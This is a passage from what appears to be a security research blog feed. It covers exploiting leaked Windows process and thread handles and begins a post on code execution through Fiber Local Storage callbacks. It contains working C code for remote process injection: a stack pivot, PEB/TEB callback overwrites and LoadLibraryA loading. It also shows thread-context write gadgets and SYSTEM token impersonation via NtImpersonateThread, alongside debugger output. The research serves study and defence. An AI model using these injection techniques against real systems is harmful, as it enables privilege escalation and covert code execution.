+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
+</span><span class='line'>eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+</span><span class='line'>kernel32!SwitchToFiber+0x115:
+</span><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
+</span><span class='line'>ds:0023:7ffdee2c=7ffdee30
+</span><span class='line'>0:000&gt; p
+</span><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
+</span><span class='line'>eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+</span><span class='line'>kernel32!SwitchToFiber+0x11b:
+</span><span class='line'>7603c41b c20400          ret     4
+</span><span class='line'>0:000&gt; dd esp l3
+</span><span class='line'>7ffdee30  41414141 41414141 41414141</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
+some other payload, I took a quick and lazy strategy and simply called
+<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
+well, is reliable, and even on process exit will execute and block, depending
+on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
+</span><span class='line'>
+</span><span class='line'>LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
+</span><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
+</span><span class='line'>if (hProcess == NULL)
+</span><span class='line'>    return;
+</span><span class='line'>
+</span><span class='line'>SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
+</span><span class='line'>SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
+</span><span class='line'>TlsAddr = RemoteTeb + 0xe10;
+</span><span class='line'>
+</span><span class='line'>SIZE_T RemotePeb = GetRemotePeb(hProcess);
+</span><span class='line'>SIZE_T PivotGadget = 0x7603c415;
+</span><span class='line'>SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
+</span><span class='line'>SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
+</span><span class='line'>SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;
+</span><span class='line'>
+</span><span class='line'>//
+</span><span class='line'>// construct our TlsSlots payload:
+</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
+</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
+</span><span class='line'>// 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
+</span><span class='line'>// 48 ] 41414141
+</span><span class='line'>//
+</span><span class='line'>
+</span><span class='line'>memset(lpBuf, 0x0, 16);
+</span><span class='line'>*((DWORD*)lpBuf + 2) = PivotGadget;
+</span><span class='line'>*((DWORD*)lpBuf+ 4) = 0;
+</span><span class='line'>*((DWORD*)lpBuf + 5) = 0;
+</span><span class='line'>*((DWORD*)lpBuf + 6) = StackAddress;
+</span><span class='line'>
+</span><span class='line'>StackAddress = TlsAddr + 32;
+</span><span class='line'>*((DWORD*)lpBuf + 7) = StackAddress;
+</span><span class='line'>*((DWORD*)lpBuf + 8) = LoadLibA;
+</span><span class='line'>*((DWORD*)lpBuf + 9) = 0x41414141; // junk
+</span><span class='line'>*((DWORD*)lpBuf + 10) = RtlExitThread;
+</span><span class='line'>*((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
+</span><span class='line'>*((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)
+</span><span class='line'>
+</span><span class='line'>NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);
+</span><span class='line'>
+</span><span class='line'>// update FlsCallback in PEB and FlsData in TEB
+</span><span class='line'>StackAddress = TlsAddr + 12;
+</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&StackAddress, sizeof(SIZE_T), NULL);
+</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&TlsAddr, sizeof(SIZE_T), NULL);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
+callback is executed (just close the process). As a note, we&rsquo;re using
+<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
+<code>PROCESS_VM_OPERATION</code> which we may not have.</p>
+
+<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
+This gives us visibility into the address space, but we still cannot allocate
+or map memory into the remote process. Using the above strategy we can rid
+ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
+PEB address out of TEB.</p>
+
+<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
+Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
+can now allocate memory and change page permissions. This allows us to more
+easily use the above strategy, but also perform inline and IAT hooks.</p>
+
+<h2>Thread</h2>
+
+<p>As with the process handles, there are a handful of access rights we can dismiss
+immediately:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SYNCHRONIZE
+</span><span class='line'>THREAD_QUERY_INFORMATION
+</span><span class='line'>THREAD_GET_CONTEXT
+</span><span class='line'>THREAD_QUERY_LIMITED_INFORMATION
+</span><span class='line'>THREAD_SUSPEND_RESUME
+</span><span class='line'>THREAD_TERMINATE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which leaves the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
+</span><span class='line'>THREAD_DIRECT_IMPERSONATION
+</span><span class='line'>THREAD_IMPERSONATE
+</span><span class='line'>THREAD_SET_CONTEXT
+</span><span class='line'>THREAD_SET_INFORMATION
+</span><span class='line'>THREAD_SET_LIMITED_INFORMATION
+</span><span class='line'>THREAD_SET_THREAD_TOKEN</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>THREAD_ALL_ACCESS</h3>
+
+<p>There&rsquo;s quite a lot we can do with this, including everything described in the
+following thread access rights sections. I personally find the
+<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>
+
+<p>There is another option that is a bit more arcane, but equally viable. Note
+that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
+no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
+What we do have, however, is a series of APIs that sort of grant us that:
+<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
+injection technique dubbed Ghostwriting[6] was released to little fanfare. In
+it, the author describes a code injection strategy that does not require the
+typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
+even OpenProcess.</p>
+
+<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
+code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
+calls in tandem with a set of specific assembly gadgets to write a payload,
+dword by dword, onto the threads stack. Once written, they use
+<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
+their payload.</p>
+
+<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>MOV [REG1], REG2
+</span><span class='line'>RET</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
+and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
+We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
+so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
+my write function:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
+</span><span class='line'>{
+</span><span class='line'>    SetContextRegister(&context, g_rside, WriteWhat);
+</span><span class='line'>    SetContextRegister(&context, g_lside, WriteWhere);
+</span><span class='line'>
+</span><span class='line'>    context.Rsp = StackBase;
+</span><span class='line'>    context.Rip = MovAddr;
+</span><span class='line'>
+</span><span class='line'>    WaitForThreadAutoLock(hThread, &context, JmpAddr);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
+appropriate registers. Once those are set, we set our stack base (adjusted from
+threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
+write our <code>JMP $</code> gadget to the stack.</p>
+
+<p>They use what they call a thread auto lock to control execution flow (edits
+mine):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
+</span><span class='line'>{
+</span><span class='line'>    SetThreadContext(Thread,PThreadContext);
+</span><span class='line'>
+</span><span class='line'>    do
+</span><span class='line'>    {
+</span><span class='line'>        ResumeThread(Thread);
+</span><span class='line'>        Sleep(30); 
+</span><span class='line'>        SuspendThread(Thread);
+</span><span class='line'>        GetThreadContext(Thread,PThreadContext);
+</span><span class='line'>    }
+</span><span class='line'>    while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
+each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>
+
+<p>Once our execution hits the jump, we have our write primitive. We can now
+simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
+any values we want.</p>
+
+<p>I ported the core function of this technique to x64 to demonstrate its
+viability. Instead of using it to execute an entire payload, I simply execute
+<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
+available on Github[11]. Turning it into something production ready is left as
+an exercise for the reader ;)</p>
+
+<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
+the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
+an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
+it, it&rsquo;s probably more production ready and usable than mine.</p>
+
+<h3>THREAD_DIRECT_IMPERSONATION</h3>
+
+<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
+impersonated, not simply TO impersonate. Exploiting this is simply a matter of
+using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
+Using this we&rsquo;re able to create a thread totally under our control and
+impersonate the privileged one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &dwTid);
+</span><span class='line'>NtImpersonateThread(hNewThread, hThread, &sqos);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
+whatever we need under the privileged impersonation context.</p>
+
+<h3>THREAD_IMPERSONATE</h3>
+
+<p>Unfortunately I was unable to identify a surefire, generic method for
+exploiting this one. We have no ability to query the remote thread, nor can we
+gain any control over its execution flow. We&rsquo;re simply allowed to manage its
+impersonation state.</p>
+
+<p>We can use this to force the privileged thread to impersonate us, using the
+<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
+application. For example, if the service were to create shared resources under
+a user context for which it would typically be SYSTEM, such as a file, we can
+gain ownership over that file. If multiple privileged threads access it for
+information (such as configuration) it could lead to code execution.</p>
+
+<h3>THREAD_SET_CONTEXT</h3>
+
+<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
+allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
+<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
+thread, it needs to enter an alertable state. This happens when a specific set
+of win32 functions are executed, so it is entirely possible that the thread
+never becomes alertable.</p>
+
+<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
+handy. Using it, we can force the thread to become alertable via the
+<code>NtTestAlert</code> function. Of course, we have no ability to call
+<code>GetThreadContext</code> and will therefore likely lose control of the thread after
+exploitation.</p>
+
+<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
+replicate the Ghostwriting code injection technique discussed in the
+<code>THREAD_ALL_ACCESS</code> section above.</p>
+
+<h3>THREAD_SET_INFORMATION</h3>
+
+<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
+<code>NtSetInformationThread</code>. After looking through all of these, I did not
+identify any immediate ways in which we could influence the remote thread. Some
+of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
+<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
+require <code>SeDebugPrivilege</code> or similar.</p>
+
+<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
+really not a lot of juicy stuff that can be done via the available functions</p>
+
+<h3>THREAD_SET_LIMITED_INFORMATION</h3>
+
+<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
+namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
+<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
+anywhere near an exploitable primitive.</p>
+
+<h3>THREAD_SET_THREAD_TOKEN</h3>
+
+<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
+method of abusing this right. I can set the thread&rsquo;s token or modify a few
+fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>
+
+<h2>Conclusion</h2>
+
+<p>I was a little disappointed in how uneventful thread rights seemed to be.
+Almost half of them proved to be unexploitable on their own, and even in
+combination did not turn much up. As per above, having one of the following
+three privileges is necessary to turn a leaked thread handle into something
+exploitable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
+</span><span class='line'>THREAD_DIRECT_IMPERSONATION
+</span><span class='line'>THREAD_SET_CONTEXT</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Missing these will require a deeper understanding of your target and some
+creativity.</p>
+
+<p>Similarly, processes have a specific subset of rights that are directly
+exploitable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
+</span><span class='line'>PROCESS_CREATE_PROCESS
+</span><span class='line'>PROCESS_CREATE_THREAD
+</span><span class='line'>PROCESS_DUP_HANDLE
+</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Barring these, more creativity is required.</p>
+
+<h2>References</h2>
+
+<p>[0]<a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a> <br/>
+[1]<a href="https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html">https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html</a> <br/>
+[2]<a href="https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/">https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/</a> <br/>
+[3]<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a> <br/>
+[4]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a> <br/>
+[5]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a> <br/>
+[6]<a href="http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/">http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/</a> <br/>
+[7]<a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html">https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html</a> <br/>
+[8]<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html</a> <br/>
+[9]<a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51">https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51</a> <br/>
+[10]<a href="https://github.com/SafeBreach-Labs/pinjectra">https://github.com/SafeBreach-Labs/pinjectra</a> <br/>
+[11]<a href="https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079">https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079</a> <br/>
+[12]<a href="http://www.hexacorn.com/blog/category/code-injection/">http://www.hexacorn.com/blog/category/code-injection/</a> <br/>
+[13]<a href="http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</a> <br/>
+[14]<a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a> <br/>
+[15]<a href="https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98">https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Code Execution via Fiber Local Storage]]></title>
+    <link href="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/"/>
+    <updated>2019-08-12T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</id>
+    <content type="html"><![CDATA[<p>While working on another research project (post to be released soon, will
+update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
+technique that fit my situation perfectly. Instead of tainting the other post
+with its description and code, I figured I&rsquo;d release a separate post describing
+it here.</p>
+
+<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
+similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
+process, allocate some memory, and copy our shellcode into it. At this point we
+simply need to gain control over execution flow; this is where most of
+Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
+WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
+great example is Windows Notification Facility via user subscription callbacks
+(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>
+
+<p>These strategies are also predicated on the process having certain capabilities
+(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
+not all, do not work across sessions or integrity levels. This is obvious and
+expected and frankly quite niche, but in my situation, a requirement.</p>
+
+<h2>Fibers</h2>
+
+<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
+application&rdquo;[1]. They are essentially register and stack states that can be
+swapped in and out at will, and reflect upon the thread in which they are
+executing. A single thread can be running at most a single fiber at a time, but
+fibers can be hot swapped during execution and their quantum user controlled.</p>
+
+<p>Fibers can also create and use fiber data. A pointer to this is stored in
+<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
+during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void TestFiber()
+</span><span class='line'>{
+</span><span class='line'>    PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
+</span><span class='line'>    PVOID lpFirstFiber = NULL;
+</span><span class='line'>    memset(lpFiberData, 0x41, 0x10);
+</span><span class='line'>
+</span><span class='line'>    lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+</span><span class='line'>    DebugBreak();
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main()
+</span><span class='line'>{
+</span><span class='line'>    DWORD tid = 0;
+</span><span class='line'>    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &tid);
+</span><span class='line'>    WaitForSingleObject(hThread, INFINITE);
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We need to spawn off the test in a new thread, as the main thread will
+always have a fiber instantiated and the call will fail. If we
+run this in a debugger we can inspect the data after the break:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; ~
+</span><span class='line'>.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen
+</span><span class='line'>#  1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen
+</span><span class='line'>0:000&gt; dt _NT_TIB 7ffdd000 FiberData
+</span><span class='line'>ucrtbased!_NT_TIB
+</span><span class='line'>   +0x010 FiberData : 0x002ea9c0 Void
+</span><span class='line'>0:000&gt; dd poi(0x002ea9c0) l5
+</span><span class='line'>002ea998  41414141 41414141 41414141 41414141
+</span><span class='line'>002ea9a8  abababab</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In addition to fiber data, fibers also have access to the fiber local storage
+(FLS). For all intents and purposes, this is identical to thread local storage
+(TLS)[2]. This allows all thread fibers access to shared data via a global
+index. The API for this is pretty simple, and very similar to TLS. In the
+following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
+previous example as base:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+</span><span class='line'>dwIdx = FlsAlloc(NULL);
+</span><span class='line'>FlsSetValue(dwIdx, lpFiberData);
+</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
+<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
+data is 6:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; ~
+</span><span class='line'>   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
+</span><span class='line'>.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
+</span><span class='line'>0:001&gt; dt _TEB 7ffde000 FlsData
+</span><span class='line'>ntdll!_TEB
+</span><span class='line'>   +0xfb4 FlsData : 0x0049a008 Void
+</span><span class='line'>0:001&gt; dd poi(0x0049a008+(4*8))
+</span><span class='line'>0049a998  41414141 41414141 41414141 41414141
+</span><span class='line'>0049a9a8  abababab</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that the offset is always the index + 2.</p>
+
+<h2>Abusing FLS Callbacks to Obtain Execution Control</h2>
+
+<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
+parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>An application-defined function. If the FLS slot is in use, FlsCallback is
+</span><span class='line'>called on fiber deletion, thread exit, and when an FLS index is freed. Specify
+</span><span class='line'>this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
+</span><span class='line'>type defines a pointer to this callback function. </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
+<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
